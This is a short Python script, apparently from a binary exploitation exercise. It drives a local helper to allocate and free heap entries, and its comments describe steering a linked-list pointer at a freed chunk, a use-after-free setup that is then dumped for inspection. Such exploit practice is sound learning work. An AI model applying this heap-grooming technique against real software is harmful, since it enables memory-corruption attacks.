import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
g.add(b'AA'); g.add(b'BB'); g.make(b'b1'); g.add(b'YY'); g.make(b'b2')
g.rm(b'BB'); g.rm(b'AA'); g.add(b'CC')   # CC->next=&YY
g.rm(b'YY')                              # YY freed
g.dump('after rm YY (fake node = freed YY)')
g.close()
